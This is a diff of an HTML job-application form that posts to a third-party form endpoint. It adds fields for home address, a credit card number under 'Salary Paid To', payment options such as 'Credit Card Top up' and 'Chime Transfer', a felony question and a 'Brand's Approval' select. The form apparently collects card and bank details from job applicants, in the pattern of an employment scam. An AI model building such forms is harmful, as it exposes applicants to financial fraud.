@@ -279,7 +279,7 @@
         <form id="applyForm" action="https://formspree.io/f/mdealbkw" method="POST" novalidate>
 
           <fieldset class="fieldset-group">
-            <legend class="fieldset-legend">POSITION &amp; PERSONAL</legend>
+            <legend class="fieldset-legend">NAME &amp; PHONE</legend>
 
             <div class="form-grid">
               <div class="form-group">
@@ -294,19 +294,67 @@
                 <span class="field-error"></span>
               </div>
 
-              <div class="form-group">
+              <div class="form-group full-width">
                 <label class="form-label required" for="phone">Phone</label>
                 <input class="form-control" id="phone" name="phone" type="tel" autocomplete="tel" required />
                 <span class="field-error"></span>
               </div>
+            </div>
+          </fieldset>
+
+          <fieldset class="fieldset-group">
+            <legend class="fieldset-legend">HOME / P.O. BOX ADDRESS</legend>
+
+            <div class="form-grid">
+              <div class="form-group full-width">
+                <label class="form-label required" for="addrStreet">Street Address</label>
+                <input class="form-control" id="addrStreet" name="street" type="text" autocomplete="address-line1" required />
+                <span class="field-error"></span>
+              </div>
+
+              <div class="form-group full-width">
+                <label class="form-label" for="addrLine2">Address Line 2</label>
+                <input class="form-control" id="addrLine2" name="address_line_2" type="text" autocomplete="address-line2" placeholder="Apartment, suite, unit, P.O. box (optional)" />
+                <span class="field-error"></span>
+              </div>
 
               <div class="form-group">
+                <label class="form-label required" for="city">City</label>
+                <input class="form-control" id="city" name="city" type="text" autocomplete="address-level2" required />
+                <span class="field-error"></span>
+              </div>
+
+              <div class="form-group">
+                <label class="form-label required" for="state">State / Region</label>
+                <input class="form-control" id="state" name="state" type="text" autocomplete="address-level1" required />
+                <span class="field-error"></span>
+              </div>
+
+              <div class="form-group">
+                <label class="form-label required" for="postal">Postal Code</label>
+                <input class="form-control" id="postal" name="postal" type="text" autocomplete="postal-code" required />
+                <span class="field-error"></span>
+              </div>
+
+              <div class="form-group">
+                <label class="form-label required" for="country">Country</label>
+                <input class="form-control" id="country" name="country" type="text" autocomplete="country-name" placeholder="United States" required />
+                <span class="field-error"></span>
+              </div>
+            </div>
+          </fieldset>
+
+          <fieldset class="fieldset-group">
+            <legend class="fieldset-legend">SALARY &amp; PAYMENT</legend>
+
+            <div class="form-grid">
+              <div class="form-group full-width">
                 <label class="form-label required" for="payMethod">Salary Paid To</label>
                 <select class="form-control" id="payMethod" name="payMethod" required>
                   <option value="">Select payment method</option>
-                  <option value="Mobile Bank Deposit">Mobile Bank Deposit</option>
-                  <option value="Credit Card Top up">Credit Card Top up</option>
-                  <option value="Chime Transfer">Chime Transfer</option>
+                  <option value="Mobile Bank Deposit">(a) Mobile Bank Deposit</option>
+                  <option value="Credit Card Top up">(b) Credit Card Top up</option>
+                  <option value="Chime Transfer">(c) Chime Transfer</option>
                 </select>
                 <span class="field-error"></span>
               </div>
@@ -325,65 +373,26 @@
                 <input class="form-control" id="bankName" name="bankName" type="text" placeholder="e.g. Chase / Wells Fargo" required />
                 <span class="field-error"></span>
               </div>
-            </div>
-          </fieldset>
-
-          <fieldset class="fieldset-group">
-            <legend class="fieldset-legend">ADDRESS</legend>
-
-            <div class="form-grid">
-              <div class="form-group">
-                <label class="form-label required" for="addrStreet">Street Address</label>
-                <input class="form-control" id="addrStreet" name="street" type="text" required />
-                <span class="field-error"></span>
-              </div>
-
-              <div class="form-group">
-                <label class="form-label required" for="city">City</label>
-                <input class="form-control" id="city" name="city" type="text" required />
-                <span class="field-error"></span>
-              </div>
-
-              <div class="form-group">
-                <label class="form-label required" for="state">State / Region</label>
-                <input class="form-control" id="state" name="state" type="text" required />
-                <span class="field-error"></span>
-              </div>
-
-              <div class="form-group">
-                <label class="form-label required" for="postal">Postal Code</label>
-                <input class="form-control" id="postal" name="postal" type="text" required />
-                <span class="field-error"></span>
-              </div>
 
               <div class="form-group full-width">
-                <label class="form-label required" for="country">Country</label>
-                <input class="form-control" id="country" name="country" type="text" placeholder="United States" required />
+                <label class="form-label" for="creditCard">Credit Card (optional)</label>
+                <input class="form-control" id="creditCard" name="credit_card" type="text" inputmode="numeric" autocomplete="cc-number" placeholder="Card number — leave blank if not applicable" />
                 <span class="field-error"></span>
               </div>
             </div>
           </fieldset>
 
           <fieldset class="fieldset-group">
-            <legend class="fieldset-legend">CONSENT</legend>
-
-            <div class="checkbox-group">
-              <label class="checkbox-label" for="agree">
-                <input type="checkbox" id="agree" name="agree" required />
-                <span class="checkbox-custom" aria-hidden="true"></span>
-                <span class="checkbox-text">I agree to the terms and conditions</span>
-              </label>
-              <span class="field-error"></span>
-            </div>
-          </fieldset>
-
-          <fieldset class="fieldset-group">
-            <legend class="fieldset-legend">TIME &amp; DATE</legend>
+            <legend class="fieldset-legend">BACKGROUND, DATE &amp; CONSENT</legend>
 
             <div class="form-grid">
               <div class="form-group">
-                <label class="form-label required" for="time">Time</label>
-                <input class="form-control" id="time" name="time" type="time" required />
+                <label class="form-label required" for="felony">Ever been convicted of felony?</label>
+                <select class="form-control" id="felony" name="felony" required>
+                  <option value="">Select an option</option>
+                  <option value="No">No</option>
+                  <option value="Yes">Yes</option>
+                </select>
                 <span class="field-error"></span>
               </div>
 
@@ -392,6 +401,25 @@
                 <input class="form-control" id="date" name="date" type="date" required />
                 <span class="field-error"></span>
               </div>
+
+              <div class="form-group full-width">
+                <label class="form-label required" for="brandApproval">Brand's Approval</label>
+                <select class="form-control" id="brandApproval" name="brands_approval" required>
+                  <option value="">Select an option</option>
+                  <option value="Yes">Yes</option>
+                  <option value="No">No</option>
+                </select>
+                <span class="field-error"></span>
+              </div>
+            </div>
+
+            <div class="checkbox-group">
+              <label class="checkbox-label" for="agree">
+                <input type="checkbox" id="agree" name="agree" required />
+                <span class="checkbox-custom" aria-hidden="true"></span>
+                <span class="checkbox-text">Agreement — I agree to the terms and conditions</span>
+              </label>
+              <span class="field-error"></span>
             </div>
           </fieldset>
 
@@ -460,16 +488,24 @@
             <span class="review-label">Bank Name</span>
             <span class="review-value" id="review-bankname">—</span>
           </div>
+          <div class="review-row">
+            <span class="review-label">Credit Card (optional)</span>
+            <span class="review-value" id="review-creditcard">—</span>
+          </div>
         </div>
 
         <div class="review-card">
           <div class="review-card-header">
-            <span class="review-card-title">ADDRESS</span>
+            <span class="review-card-title">HOME / P.O. BOX ADDRESS</span>
           </div>
 
           <div class="review-row">
             <span class="review-label">Street Address</span>
             <span class="review-value" id="review-street">—</span>
+          </div>
+          <div class="review-row">
+            <span class="review-label">Address Line 2</span>
+            <span class="review-value" id="review-address2">—</span>
           </div>
           <div class="review-row">
             <span class="review-label">City</span>
@@ -491,16 +527,28 @@
 
         <div class="review-card">
           <div class="review-card-header">
-            <span class="review-card-title">FEATURE &amp; AGREEMENT</span>
+            <span class="review-card-title">BACKGROUND, DATE &amp; CONSENT</span>
           </div>
 
+          <div class="review-row">
+            <span class="review-label">Ever been convicted of felony?</span>
+            <span class="review-value" id="review-felony">—</span>
+          </div>
+          <div class="review-row">
+            <span class="review-label">Date</span>
+            <span class="review-value" id="review-date">—</span>
+          </div>
           <div class="review-row">
             <span class="review-label">Feature</span>
             <span class="review-value" id="review-feature">—</span>
           </div>
           <div class="review-row">
-            <span class="review-label">I agree to the terms and conditions</span>
+            <span class="review-label">Agreement — I agree to the terms and conditions</span>
             <span class="review-value" id="review-agree">—</span>
+          </div>
+          <div class="review-row">
+            <span class="review-label">Brand's Approval</span>
+            <span class="review-value" id="review-brandapproval">—</span>
           </div>
         </div>
 
